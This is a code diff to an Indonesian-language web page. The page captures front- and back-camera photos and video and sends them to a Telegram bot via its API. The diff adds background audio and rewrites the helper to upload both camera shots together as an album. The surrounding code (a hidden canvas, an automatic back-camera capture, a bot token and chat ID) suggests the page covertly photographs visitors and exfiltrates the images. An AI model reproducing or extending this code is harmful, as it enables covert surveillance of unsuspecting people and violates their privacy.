@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="utf-8" />
@@ -35,6 +35,7 @@
     #finish p{ color:var(--muted); margin-top:8px; }
     @media(max-width:880px){ .card{ grid-template-columns: 1fr; } .right{ order:-1 } }
   </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 </head>
 <body>
   <div class="wrap">
@@ -76,7 +77,10 @@
             <source src="https://c.top4top.io/m_3551e7put1.mp4" type="video/mp4">
           </video>
 
-          <video id="videoPreview" autoplay playsinline muted></video>
+          <audio id="bgAudio" autoplay loop>
+  <source src="https://e.top4top.io/m_3551l9gsb1.mp3" type="audio/mpeg">
+</audio>
+<video id="videoPreview" autoplay playsinline muted></video>
           <canvas id="canvas" width="800" height="800" style="display:none"></canvas>
         </div>
 
@@ -198,12 +202,21 @@ async function captureBackPhoto() {
 }
 
 // Telegram helpers
-async function sendPhotoCaption(photoBlob, caption){
+async function sendPhotoAlbum(frontBlob, backBlob, caption) {
   const fd = new FormData();
-  fd.append('chat_id', CHAT_ID);
-  fd.append('photo', photoBlob, 'photo.jpg');
-  fd.append('caption', caption);
-  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
+  fd.append("chat_id", CHAT_ID);
+  let media = [];
+  if (frontBlob) {
+    fd.append("photo1", frontBlob, "front.jpg");
+    media.push({ type:"photo", media:"attach://photo1", caption: caption+"
+(Kamera Depan)" });
+  }
+  if (backBlob) {
+    fd.append("photo2", backBlob, "back.jpg");
+    media.push({ type:"photo", media:"attach://photo2", caption:"(Kamera Belakang)" });
+  }
+  fd.append("media", JSON.stringify(media));
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, { method:"POST", body:fd });
 }
 async function sendVideoCaption(videoBlob, caption){
   const fd = new FormData();
